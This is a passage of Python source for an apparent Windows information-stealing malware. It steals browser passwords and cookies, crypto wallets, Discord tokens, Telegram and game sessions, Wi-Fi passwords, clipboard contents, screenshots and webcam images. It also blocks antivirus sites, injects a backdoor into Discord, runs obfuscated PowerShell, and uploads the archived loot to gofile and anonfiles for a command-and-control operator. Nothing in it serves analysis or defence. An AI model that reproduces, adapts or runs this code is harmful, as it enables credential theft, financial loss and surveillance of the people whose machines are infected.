                    file.write('Multiple Steam installations are found, so the files for each of them are put in different Profiles')

    @Errors.Catch
    def StealUplay(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Uplay session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Uplay')
            uplayPath = os.path.join(os.getenv('localappdata'), 'Ubisoft Game Launcher')
            if os.path.isdir(uplayPath):
                for item in os.listdir(uplayPath):
                    if os.path.isfile(os.path.join(uplayPath, item)):
                        os.makedirs(saveToPath, exist_ok=True)
                        shutil.copy(os.path.join(uplayPath, item), os.path.join(saveToPath, item))
                        self.UplayStolen = True

    @Errors.Catch
    def StealBattleNet(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Battle.Net session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Battle.Net')
            battlePath = os.path.join(os.getenv('appdata'), 'Battle.net')
            if os.path.isdir(battlePath):
                for item in os.listdir(battlePath):
                    if os.path.isfile(os.path.join(battlePath, item)):
                        os.makedirs(saveToPath, exist_ok=True)
                        shutil.copy(os.path.join(battlePath, item), os.path.join(saveToPath, item))
                        self.BattleNetStolen = True

    @Errors.Catch
    def StealRobloxCookies(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Roblox cookies')
            saveToDir = os.path.join(self.TempFolder, 'Games', 'Roblox')
            note = '# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not.'
            cookies = []
            browserCookies = '\n'.join(self.Cookies)
            for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', browserCookies):
                cookies.append(match)
            output = list()
            for item in ('HKCU', 'HKLM'):
                process = subprocess.run('powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY'.format(item), capture_output=True, shell=True)
                if not process.returncode:
                    output.append(process.stdout.decode(errors='ignore'))
            for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', '\n'.join(output)):
                cookies.append(match)
            cookies = [*set(cookies)]
            if cookies:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Roblox Cookies.txt'), 'w') as file:
                    file.write('{}{}{}'.format(note, self.Separator, self.Separator.join(cookies)))
                self.RobloxCookiesCount += len(cookies)

    @Errors.Catch
    def StealWallets(self) -> None:
        if Settings.CaptureWallets:
            Logger.info('Stealing crypto wallets')
            saveToDir = os.path.join(self.TempFolder, 'Wallets')
            wallets = (('Zcash', os.path.join(os.getenv('appdata'), 'Zcash')), ('Armory', os.path.join(os.getenv('appdata'), 'Armory')), ('Bytecoin', os.path.join(os.getenv('appdata'), 'Bytecoin')), ('Jaxx', os.path.join(os.getenv('appdata'), 'com.liberty.jaxx', 'IndexedDB', 'file_0.indexeddb.leveldb')), ('Exodus', os.path.join(os.getenv('appdata'), 'Exodus', 'exodus.wallet')), ('Ethereum', os.path.join(os.getenv('appdata'), 'Ethereum', 'keystore')), ('Electrum', os.path.join(os.getenv('appdata'), 'Electrum', 'wallets')), ('AtomicWallet', os.path.join(os.getenv('appdata'), 'atomic', 'Local Storage', 'leveldb')), ('Guarda', os.path.join(os.getenv('appdata'), 'Guarda', 'Local Storage', 'leveldb')), ('Coinomi', os.path.join(os.getenv('localappdata'), 'Coinomi', 'Coinomi', 'wallets')))
            browserPaths = {'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'Iridium': os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')}
            for (name, path) in wallets:
                if os.path.isdir(path):
                    _saveToDir = os.path.join(saveToDir, name)
                    os.makedirs(_saveToDir, exist_ok=True)
                    try:
                        shutil.copytree(path, os.path.join(_saveToDir, os.path.basename(path)), dirs_exist_ok=True)
                        with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                            file.write(path)
                        self.WalletsCount += 1
                    except Exception:
                        try:
                            shutil.rmtree(_saveToDir)
                        except Exception:
                            pass
            for (name, path) in browserPaths.items():
                if os.path.isdir(path):
                    for (root, dirs, _) in os.walk(path):
                        for _dir in dirs:
                            if _dir == 'Local Extension Settings':
                                localExtensionsSettingsDir = os.path.join(root, _dir)
                                for _dir in ('ejbalbakoplchlghecdalmeeeajnimhm', 'nkbihfbeogaeaoehlefnkodbefgpgknn'):
                                    extentionPath = os.path.join(localExtensionsSettingsDir, _dir)
                                    if os.path.isdir(extentionPath) and os.listdir(extentionPath):
                                        try:
                                            metamask_browser = os.path.join(saveToDir, 'Metamask ({})'.format(name))
                                            _saveToDir = os.path.join(metamask_browser, _dir)
                                            shutil.copytree(extentionPath, _saveToDir, dirs_exist_ok=True)
                                            with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                                                file.write(extentionPath)
                                            self.WalletsCount += 1
                                        except Exception:
                                            try:
                                                shutil.rmtree(_saveToDir)
                                                if not os.listdir(metamask_browser):
                                                    shutil.rmtree(metamask_browser)
                                            except Exception:
                                                pass

    @Errors.Catch
    def StealSystemInfo(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Stealing system information')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('systeminfo', capture_output=True, shell=True)
            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
            if output:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'System Info.txt'), 'w') as file:
                    file.write(output)
                self.SystemInfoStolen = True
            process = subprocess.run('getmac', capture_output=True, shell=True)
            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
            if output:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'MAC Addresses.txt'), 'w') as file:
                    file.write(output)
                self.SystemInfoStolen = True

    @Errors.Catch
    def GetDirectoryTree(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting directory trees')
            PIPE = chr(9474) + '   '
            TEE = ''.join((chr(x) for x in (9500, 9472, 9472))) + ' '
            ELBOW = ''.join((chr(x) for x in (9492, 9472, 9472))) + ' '
            output = {}
            for (name, dir) in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                if os.path.isdir(dir):
                    dircontent: list = os.listdir(dir)
                    if 'desltop.ini' in dircontent:
                        dircontent.remove('desktop.ini')
                    if dircontent:
                        process = subprocess.run('tree /A /F', shell=True, capture_output=True, cwd=dir)
                        if process.returncode == 0:
                            output[name] = (name + '\n' + '\n'.join(process.stdout.decode(errors='ignore').splitlines()[3:])).replace('|   ', PIPE).replace('+---', TEE).replace('\\---', ELBOW)
            for (key, value) in output.items():
                os.makedirs(os.path.join(self.TempFolder, 'Directories'), exist_ok=True)
                with open(os.path.join(self.TempFolder, 'Directories', '{}.txt'.format(key)), 'w', encoding='utf-8') as file:
                    file.write(value)
                self.SystemInfoStolen = True

    @Errors.Catch
    def GetClipboard(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting clipboard text')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('powershell Get-Clipboard', shell=True, capture_output=True)
            if process.returncode == 0:
                content = process.stdout.decode(errors='ignore').strip()
                if content:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Clipboard.txt'), 'w', encoding='utf-8') as file:
                        file.write(content)

    @Errors.Catch
    def GetAntivirus(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting antivirus')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName', shell=True, capture_output=True)
            if process.returncode == 0:
                output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n').splitlines()
                if len(output) >= 2:
                    output = output[1:]
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Antivirus.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                        file.write('\n'.join(output))

    @Errors.Catch
    def GetTaskList(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting task list')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('tasklist /FO LIST', capture_output=True, shell=True)
            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
            if output:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Task List.txt'), 'w', errors='ignore') as tasklist:
                    tasklist.write(output)

    @Errors.Catch
    def GetWifiPasswords(self) -> None:
        if Settings.CaptureWifiPasswords:
            Logger.info('Getting wifi passwords')
            saveToDir = os.path.join(self.TempFolder, 'System')
            passwords = Utility.GetWifiPasswords()
            profiles = list()
            for (profile, psw) in passwords.items():
                profiles.append(f'Network: {profile}\nPassword: {psw}')
            if profiles:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Wifi Networks.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(profiles))
                self.WifiPasswordsCount += len(profiles)

    @Errors.Catch
    def TakeScreenshot(self) -> None:
        if Settings.CaptureScreenshot:
            Logger.info('Taking screenshot')
            command = 'JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA='
            if subprocess.run(['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', command], shell=True, capture_output=True, cwd=self.TempFolder).returncode == 0:
                self.ScreenshotTaken = True

    @Errors.Catch
    def BlockSites(self) -> None:
        if Settings.BlockAvSites:
            Logger.info('Blocking AV sites')
            Utility.BlockSites()
            Utility.TaskKill('chrome', 'firefox', 'msedge', 'safari', 'opera', 'iexplore')

    @Errors.Catch
    def StealBrowserData(self) -> None:
        if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory or Settings.CaptureAutofills)):
            return
        Logger.info('Stealing browser data')
        threads: list[Thread] = []
        paths = {'Brave': (os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'brave'), 'Chrome': (os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'chrome'), 'Chromium': (os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'chromium'), 'Comodo': (os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'comodo'), 'Edge': (os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'msedge'), 'EpicPrivacy': (os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'epic'), 'Iridium': (os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'iridium'), 'Opera': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'opera'), 'Opera GX': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'operagx'), 'Slimjet': (os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'slimjet'), 'UR': (os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'urbrowser'), 'Vivaldi': (os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'vivaldi'), 'Yandex': (os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data'), 'yandex')}
        for (name, item) in paths.items():
            (path, procname) = item
            if os.path.isdir(path):

                def run(name, path):
                    try:
                        Utility.TaskKill(procname)
                        browser = Browsers.Chromium(path)
                        saveToDir = os.path.join(self.TempFolder, 'Credentials', name)
                        passwords = browser.GetPasswords() if Settings.CapturePasswords else None
                        cookies = browser.GetCookies() if Settings.CaptureCookies else None
                        history = browser.GetHistory() if Settings.CaptureHistory else None
                        autofills = browser.GetAutofills() if Settings.CaptureAutofills else None
                        if passwords or cookies or history or autofills:
                            os.makedirs(saveToDir, exist_ok=True)
                            if passwords:
                                output = ['URL: {}\nUsername: {}\nPassword: {}'.format(*x) for x in passwords]
                                with open(os.path.join(saveToDir, '{} Passwords.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.PasswordsCount += len(passwords)
                            if cookies:
                                output = ['{}\t{}\t{}\t{}\t{}\t{}\t{}'.format(host, str(expiry != 0).upper(), cpath, str(not host.startswith('.')).upper(), expiry, cname, cookie) for (host, cname, cpath, cookie, expiry) in cookies]
                                with open(os.path.join(saveToDir, '{} Cookies.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write('\n'.join(output))
                                self.Cookies.extend([str(x[3]) for x in cookies])
                            if history:
                                output = ['URL: {}\nTitle: {}\nVisits: {}'.format(*x) for x in history]
                                with open(os.path.join(saveToDir, '{} History.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.HistoryCount += len(history)
                            if autofills:
                                output = '\n'.join(autofills)
                                with open(os.path.join(saveToDir, '{} Autofills.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(output)
                                self.AutofillCount += len(autofills)
                    except Exception:
                        pass
                t = Thread(target=run, args=(name, path))
                t.start()
                threads.append(t)
        for thread in threads:
            thread.join()
        if Settings.CaptureGames:
            self.StealRobloxCookies()

    @Errors.Catch
    def Webshot(self) -> None:
        if Settings.CaptureWebcam:
            camdir = os.path.join(self.TempFolder, 'Webcam')
            os.makedirs(camdir, exist_ok=True)
            camIndex = 0
            while Syscalls.CaptureWebcam(camIndex, os.path.join(camdir, 'Webcam (%d).bmp' % (camIndex + 1))):
                camIndex += 1
                self.WebcamPicturesCount += 1
            if self.WebcamPicturesCount == 0:
                shutil.rmtree(camdir)

    @Errors.Catch
    def StealTelegramSessions(self) -> None:
        if Settings.CaptureTelegram:
            Logger.info('Stealing telegram sessions')
            telegramPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Telegram')] if x is not None])]
            multiple = len(telegramPaths) > 1
            saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Telegram')
            if not telegramPaths:
                telegramPaths.append(os.path.join(os.getenv('appdata'), 'Telegram Desktop'))
            for (index, telegramPath) in enumerate(telegramPaths):
                tDataPath = os.path.join(telegramPath, 'tdata')
                loginPaths = []
                files = []
                dirs = []
                has_key_datas = False
                if os.path.isdir(tDataPath):
                    for item in os.listdir(tDataPath):
                        itempath = os.path.join(tDataPath, item)
                        if item == 'key_datas':
                            has_key_datas = True
                            loginPaths.append(itempath)
                        if os.path.isfile(itempath):
                            files.append(item)
                        else:
                            dirs.append(item)
                    for filename in files:
                        for dirname in dirs:
                            if dirname + 's' == filename:
                                loginPaths.extend([os.path.join(tDataPath, x) for x in (filename, dirname)])
                if has_key_datas and len(loginPaths) - 1 > 0:
                    _saveToDir = saveToDir
                    if multiple:
                        _saveToDir = os.path.join(_saveToDir, 'Profile %d' % (index + 1))
                    os.makedirs(_saveToDir, exist_ok=True)
                    failed = False
                    for loginPath in loginPaths:
                        try:
                            if os.path.isfile(loginPath):
                                shutil.copy(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)))
                            else:
                                shutil.copytree(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)), dirs_exist_ok=True)
                        except Exception:
                            shutil.rmtree(_saveToDir)
                            failed = True
                            break
                    if not failed:
                        self.TelegramSessionsCount += int((len(loginPaths) - 1) / 2)
            if self.TelegramSessionsCount and multiple:
                with open(os.path.join(saveToDir, 'Info.txt'), 'w') as file:
                    file.write('Multiple Telegram installations are found, so the files for each of them are put in different Profiles')

    @Errors.Catch
    def StealDiscordTokens(self) -> None:
        if Settings.CaptureDiscordTokens:
            Logger.info('Stealing discord tokens')
            output = list()
            saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Discord')
            accounts = Discord.GetTokens()
            if accounts:
                for item in accounts:
                    (USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS) = item.values()
                    output.append('Username: {}\nUser ID: {}\nMFA enabled: {}\nEmail: {}\nPhone: {}\nVerified: {}\nNitro: {}\nBilling Method(s): {}\n\nToken: {}\n\n{}'.format(USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO, BILLING, TOKEN, GIFTS).strip())
                os.makedirs(os.path.join(self.TempFolder, 'Messenger', 'Discord'), exist_ok=True)
                with open(os.path.join(saveToDir, 'Discord Tokens.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                self.DiscordTokensCount += len(accounts)
        if Settings.DiscordInjection and (not Utility.IsInStartup()):
            paths = Discord.InjectJs()
            if paths is not None:
                Logger.info('Injecting backdoor into discord')
                for dir in paths:
                    appname = os.path.basename(dir)
                    Utility.TaskKill(appname)
                    for (root, _, files) in os.walk(dir):
                        for file in files:
                            if file.lower() == appname.lower() + '.exe':
                                time.sleep(3)
                                filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
                                UpdateEXE = os.path.join(dir, 'Update.exe')
                                DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
                                subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    def CreateArchive(self) -> tuple[str, str]:
        Logger.info('Creating archive')
        rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or 'blank123'
                process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(rarPath, password, self.ArchivePath), capture_output=True, shell=True, cwd=self.TempFolder)
                if process.returncode == 0:
                    return 'rar'
        shutil.make_archive(self.ArchivePath.rsplit('.', 1)[0], 'zip', self.TempFolder)
        return 'zip'

    def UploadToExternalService(self, path, filename=None) -> str | None:
        if os.path.isfile(path):
            Logger.info('Uploading %s to gofile' % (filename or 'file'))
            with open(path, 'rb') as file:
                fileBytes = file.read()
            if filename is None:
                filename = os.path.basename(path)
            http = PoolManager(cert_reqs='CERT_NONE')
            try:
                server = json.loads(http.request('GET', 'https://api.gofile.io/getServer').data.decode(errors='ignore'))['data']['server']
                if server:
                    url = json.loads(http.request('POST', 'https://{}.gofile.io/uploadFile'.format(server), fields={'file': (filename, fileBytes)}).data.decode(errors='ignore'))['data']['downloadPage']
                    if url:
                        return url
            except Exception:
                try:
                    Logger.error('Failed to upload to gofile, trying to upload to anonfiles')
                    url = json.loads(http.request('POST', 'https://api.anonfiles.com/upload', fields={'file': (filename, fileBytes)}).data.decode(errors='ignore'))['data']['file']['url']['short']
                    return url
                except Exception:
                    Logger.error('Failed to upload to anonfiles')
                    return None

    def SendData(self) -> None:
        Logger.info('Sending data to C2')
        extention = self.CreateArchive()
        if not os.path.isfile(self.ArchivePath):
            raise FileNotFoundError('Failed to create archive')
        filename = 'Blank-%s.%s' % (os.getlogin(), extention)
        computerName = os.getenv('computername') or 'Unable to get computer name'
        computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()
        computerOS = computerOS[2].strip() if len(computerOS) >= 2 else 'Unable to detect OS'
        totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
        totalMemory = str(int(int(totalMemory[1]) / 1000000000)) + ' GB' if len(totalMemory) >= 1 else 'Unable to detect total memory'
        uuid = subprocess.run('wmic csproduct get uuid', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
        uuid = uuid[1].strip() if len(uuid) >= 1 else 'Unable to detect UUID'
        cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to detect CPU'
        gpu = subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()
        gpu = gpu[2].strip() if len(gpu) >= 2 else 'Unable to detect GPU'
        productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to get product key'
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
            if r.get('status') != 'success':
                raise Exception('Failed')
            data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
            if len(r['reverse']) != 0:
                data += f"\nReverse DNS: {r['reverse']}"
        except Exception:
            ipinfo = '(Unable to get IP info)'
        else:
            ipinfo = data
        system_info = f'Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}'
